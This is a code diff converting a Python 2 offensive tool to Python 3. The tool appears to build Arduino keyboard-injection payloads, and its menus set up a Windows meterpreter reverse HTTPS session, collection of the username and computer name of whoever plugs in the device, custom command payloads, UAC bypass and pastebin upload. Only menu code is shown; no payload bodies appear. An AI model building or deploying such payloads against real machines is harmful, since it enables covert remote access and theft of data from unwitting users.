-      remoteIP = raw_input("Please enter the IP address of the remote server to connect to: ")
+      remoteIP = input("Please enter the IP address of the remote server to connect to: ")
     elif selection == '2':
-      remotePort = raw_input("Please enter the listening port on the remote server: ")	
+      remotePort = input("Please enter the listening port on the remote server: ")	
     elif selection == '3': 
       bypassUACoption,bypassUAC = checkUACBypass()
     elif selection == '4':
@@ -1241,8 +1250,8 @@ def WinOption9():
       bubble, bubbleSetting = notificationBubble()
     elif selection == '6':
       if done == False:
-        print "\nYou have not set all the options"
-        raw_input("Press Enter to return to the menu and set all the options")
+        print("\nYou have not set all the options")
+        input("Press Enter to return to the menu and set all the options")
       else:
         looper = True
     elif selection == '42': 
@@ -1253,7 +1262,7 @@ def WinOption9():
     elif selection == '0':
       nfoCore.Win9info()
     else: 
-      print "\n\n***That is not a valid option!***\n\n" 
+      print("\n\n***That is not a valid option!***\n\n") 
       
     if remoteIP != "" and remotePort != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
       done = True
@@ -1309,14 +1318,14 @@ def WinOption10():
   while looper != True:
 
     coreUtils.clearScreen()
-    print "******************************************************************************************************"
-    print "*                                                                                                    *"
-    print "*                         windows/meterpreter/reverse_https                                          *"
-    print "*            This payload will create a Reverse HTTPS meterpreter session                            *"
-    print "*   Options are: 1. IP Address 2. Listening Port 3. The output File name 4. direct or via pastebin   *"
-    print "*                                                                                                    *"
-    print "******************************************************************************************************"
-    print "\n"
+    print("******************************************************************************************************")
+    print("*                                                                                                    *")
+    print("*                         windows/meterpreter/reverse_https                                          *")
+    print("*            This payload will create a Reverse HTTPS meterpreter session                            *")
+    print("*   Options are: 1. IP Address 2. Listening Port 3. The output File name 4. direct or via pastebin   *")
+    print("*                                                                                                    *")
+    print("******************************************************************************************************")
+    print("\n")
   
     menu = {}
     menu['0'] = "Info"
@@ -1332,32 +1341,33 @@ def WinOption10():
     menu['99']= "Exit"
 
     options=menu.keys()
-    options.sort(key=int)
-    for entry in options: 
-      print entry, menu[entry]
+    #options.sort(key=int)
+    #for entry in options: 
+    for entry in sorted(options):
+      print(entry, menu[entry])
 
-    print "\n\n"
+    print("\n\n")
     if remoteIP != "":
-      print "IP of the remote server set to ->  " + remoteIP
+      print("IP of the remote server set to ->  " + remoteIP)
     if remotePort != "":
-      print "Listening port on the remote server set to ->  " + remotePort
+      print("Listening port on the remote server set to ->  " + remotePort)
     if RCfile != "":
-      print "Metasploit RC File name set to ->  " + RCfile
+      print("Metasploit RC File name set to ->  " + RCfile)
     if bypassUACoption != "":
-      print "bypassUAC technique set to ->  " + bypassUACoption
+      print("bypassUAC technique set to ->  " + bypassUACoption)
     if bubbleSetting != "":
-      print "Notification bubble set to -> " + bubbleSetting
+      print("Notification bubble set to -> " + bubbleSetting)
     if fileName != "":
-      print "Arduino filename set to ->  " + fileName
+      print("Arduino filename set to ->  " + fileName)
     if pastebinKey:
-        print "Upload payload to pastebin -> Enabled (key: %s)" % pastebinKey
+        print("Upload payload to pastebin -> Enabled (key: %s)" % pastebinKey)
 
-    selection=raw_input("\nPlease Select: ") 
+    selection=input("\nPlease Select: ") 
 
     if selection =='1': 
-      remoteIP = raw_input("Please enter the IP address of the remote server to connect to: ")
+      remoteIP = input("Please enter the IP address of the remote server to connect to: ")
     elif selection == '2':
-      remotePort = raw_input("Please enter the listening port on the remote server: ")	
+      remotePort = input("Please enter the listening port on the remote server: ")	
     elif selection == '3':
       RCfile = coreUtils.getRCFileName('revMetPSH.rc')
     elif selection == '4': 
@@ -1368,13 +1378,13 @@ def WinOption10():
       bubble, bubbleSetting = notificationBubble()
     elif selection == '7':
       if not pastebinKey:
-        pastebinKey = raw_input("Please enter your pastebin API key: ")
+        pastebinKey = input("Please enter your pastebin API key: ")
       else:
         pastebinKey = False
     elif selection == '8':
       if done == False:
-        print "\nYou have not set all the options"
-        raw_input("Press Enter to return to the menu and set all the options")
+        print("\nYou have not set all the options")
+        input("Press Enter to return to the menu and set all the options")
       else:
         looper = True
     elif selection == '42': 
@@ -1385,7 +1395,7 @@ def WinOption10():
     elif selection == '0':
       nfoCore.Win10info()
     else: 
-      print "\n\n***That is not a valid option!***\n\n" 
+      print("\n\n***That is not a valid option!***\n\n")
       
     if remoteIP != "" and remotePort != "" and fileName != "" and RCfile != "" and bypassUACoption != "" and bubbleSetting != "":
       done = True
@@ -1447,15 +1457,15 @@ def WinOption11():
   while looper != True:
   
     coreUtils.clearScreen()
-    print "********************************************************************************************"
-    print "*                                                                                          *"
-    print "*                             UserName and Computer Name                                   *"
-    print "*  This payload will grab the UserName and Computer Name of the who plugged in the device  *"
-    print "*                     Options are: 1. remote IP 2. Listening Port                          *"
-    print "*                                                                                          *"
-    print "*                                                                                          *"
-    print "********************************************************************************************"
-    print "\n"
+    print("********************************************************************************************")
+    print("*                                                                                          *")
+    print("*                             UserName and Computer Name                                   *")
+    print("*  This payload will grab the UserName and Computer Name of the who plugged in the device  *")
+    print("*                     Options are: 1. remote IP 2. Listening Port                          *")
+    print("*                                                                                          *")
+    print("*                                                                                          *")
+    print("********************************************************************************************")
+    print("\n")
 
     menu = {}
     menu['0'] = "Info"
@@ -1469,28 +1479,29 @@ def WinOption11():
     menu['99']= "Exit"
 
     options=menu.keys()
-    options.sort(key=int)
-    for entry in options: 
-      print entry, menu[entry]
+    #options.sort(key=int)
+    #for entry in options: 
+    for entry in sorted(options):
+      print(entry, menu[entry])
 
-    print "\n\n"
+    print("\n\n")
     if remoteIP != "":
-      print "The IP of the remote server is set to ->  " + remoteIP
+      print("The IP of the remote server is set to ->  " + remoteIP)
     if remotePort != "":
-      print "The listening port of the remote server is set to ->  " + remotePort
+      print("The listening port of the remote server is set to ->  " + remotePort)
     if bypassUACoption != "":
-      print "bypassUAC technique set to ->  " + bypassUACoption
+      print("bypassUAC technique set to ->  " + bypassUACoption)
     if bubbleSetting != "":
-      print "Notification bubble set to -> " + bubbleSetting
+      print("Notification bubble set to -> " + bubbleSetting)
     if fileName != "":
-      print "Arduino filename set to ->  " + fileName
+      print("Arduino filename set to ->  " + fileName)
     
-    selection=raw_input("\nPlease Select: ") 
+    selection=input("\nPlease Select: ") 
 
     if selection == '1':
-      remoteIP = raw_input("Please enter the IP of the server to send the data to: ")
+      remoteIP = input("Please enter the IP of the server to send the data to: ")
     elif selection == '2':
-      remotePort = raw_input("Please enter the port the server will be listening on: ")
+      remotePort = input("Please enter the port the server will be listening on: ")
     elif selection == '3': 
       bypassUACoption,bypassUAC = checkUACBypass()
     elif selection == '4':
@@ -1499,8 +1510,8 @@ def WinOption11():
       bubble, bubbleSetting = notificationBubble()
     elif selection == '6':
       if done == False:
-        print "\nYou have not set all the options"
-        raw_input("Press Enter to return to the menu and set all the options")
+        print("\nYou have not set all the options")
+        input("Press Enter to return to the menu and set all the options")
       else:
         looper = True
     elif selection == '42': 
@@ -1511,7 +1522,7 @@ def WinOption11():
     elif selection == '0':
       nfoCore.Win11info()
     else: 
-      print "\n\n***That is not a valid option!***\n\n" 
+      print("\n\n***That is not a valid option!***\n\n")
       
     if remoteIP != "" and remotePort != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
       done = True
@@ -1557,15 +1568,15 @@ def WinOption12():
   while looper != True:
   
     coreUtils.clearScreen()
-    print "********************************************************************************************"
-    print "*                                                                                          *"
-    print "*                             Custom Command Prompt Payload                                *"
-    print "*              This payload will execute a custom command prompt payload                   *"
-    print "*                   Options are: 1. CMD code 2. The output File name                       *"
-    print "*                                                                                          *"
-    print "*                                                                                          *"
-    print "********************************************************************************************"
-    print "\n"
+    print("********************************************************************************************")
+    print("*                                                                                          *")
+    print("*                             Custom Command Prompt Payload                                *")
+    print("*              This payload will execute a custom command prompt payload                   *")
+    print("*                   Options are: 1. CMD code 2. The output File name                       *")
+    print("*                                                                                          *")
+    print("*                                                                                          *")
+    print("********************************************************************************************")
+    print("\n")
 
     menu = {}
     menu['0'] = "Info"
@@ -1579,24 +1590,25 @@ def WinOption12():
     menu['99']= "Exit"
 
     options=menu.keys()
-    options.sort(key=int)
-    for entry in options: 
-      print entry, menu[entry]
+    #options.sort(key=int)
+    #for entry in options: 
+    for entry in sorted(options):
+      print(entry, menu[entry])
 
-    print "\n\n"
+    print("\n\n")
     if customCMD != "":
-      print "Command Prompt payload is set"
+      print("Command Prompt payload is set")
     if bypassUACoption != "":
-      print "bypassUAC technique set to ->  " + bypassUACoption
+      print("bypassUAC technique set to ->  " + bypassUACoption)
     if bubbleSetting != "":
-      print "Notification bubble set to -> " + bubbleSetting
+      print("Notification bubble set to -> " + bubbleSetting)
     if fileName != "":
-      print "Arduino filename set to ->  " + fileName
+      print("Arduino filename set to ->  " + fileName)
     
-    selection=raw_input("\nPlease Select: ")
+    selection=input("\nPlease Select: ")
 
     if selection =='1': 
-      customCMD = raw_input("Please input your custom CMD payload : ")
+      customCMD = input("Please input your custom CMD payload : ")
     elif selection == '2': 
       bypassUACoption,bypassUAC = checkUACBypass()
     elif selection == '3':
@@ -1605,18 +1617,18 @@ def WinOption12():
       bubble, bubbleSetting = notificationBubble()
     elif selection == '5':
       if done == False:
-        print "\nYou have not set all the options"
-        raw_input("Press Enter to return to the menu and set all the options")
+        print("\nYou have not set all the options")
+        input("Press Enter to return to the menu and set all the options")
       else:
         looper = True
     elif selection == '6':
       if customCMD == "":
-        print "you have not entered a custom CMD payload yet"
-        raw_input("Please press enter to continue")
+        print("you have not entered a custom CMD payload yet")
+        input("Please press enter to continue")
         coreUtils.clearScreen()
       else:
-        print "Custom CMD payload set as -> " + customCMD
-        raw_input("Please press enter to continue")
+        print("Custom CMD payload set as -> " + customCMD)
+        input("Please press enter to continue")
     elif selection == '42': 
       coreUtils.clearScreen()   
       break
@@ -1625,7 +1637,7 @@ def WinOption12():
     elif selection == '0':
       nfoCore.Win12info()
     else: 
-      print "\n\n***That is not a valid option!***\n\n" 
+      print("\n\n***That is not a valid option!***\n\n")
       
     if customCMD != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
       done = True
